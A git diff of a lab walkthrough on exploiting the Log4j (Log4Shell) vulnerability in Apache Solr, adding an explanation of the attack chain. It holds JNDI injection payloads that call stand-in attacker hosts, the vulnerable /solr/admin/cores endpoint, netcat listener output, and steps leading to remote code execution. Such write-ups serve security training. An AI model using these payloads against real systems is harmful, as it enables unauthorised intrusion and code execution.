@@ -34,7 +34,7 @@ one specific URL endpoint or path. This path is set to `/admin/cores`. Another i
 2021-12-13 03:47:58.346 INFO  (qtp1083962448-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
 
 ```
-The URL endpoint needs to be prefaced with `solr/`. So the address where we can supply the `params` payload 
+The URL endpoint needs to be prefaced with `solr/`. So the address where we can supply the `params={}` payload 
 would look like this: `http://MACHINE_IP:8983/solr/admin/cores`.
 <br/><br/>
 The payload to abuse this log4j vulnerability looks like this: `${jndi:ldap://ATTACKERCONTROLLEDHOST}`.
@@ -72,9 +72,12 @@ Connection received on 10.10.73.44 57114
 0
  `
 ```
-As expected, the output verifies that the target is in fact vulnerable. The netcat lsitener caught a connection. However, 
-the payload we sent only made an LDAP request, so we haven't popped a shell yet.
+As expected, the output verifies that the target is in fact vulnerable. The netcat listener caught a connection. However, 
+the payload we sent only made an LDAP request, so technically we haven't popped a shell yet.<br/>
 
-```
-TO BE CONTINUED
-```
+
+The exploitation requires us to host an LDAP referral server, which will redirect the victim's request to an HTTP server hosting our secondary payload, ultimately allowing us to run arbitrary code on the target.<br/><br/>
+The attack chain would be executed like this:<br/>
+- 1. `${jndi:ldap://attackerserver:1389/Resource}` -> reaches out to our LDAP Referral Server 
+- 2. The LDAP Referral Server then redirects the payload to our HTTP server
+- 3. The victim retrieves and executes the code on our HTTP server, which then gives us unauthenticated remote access
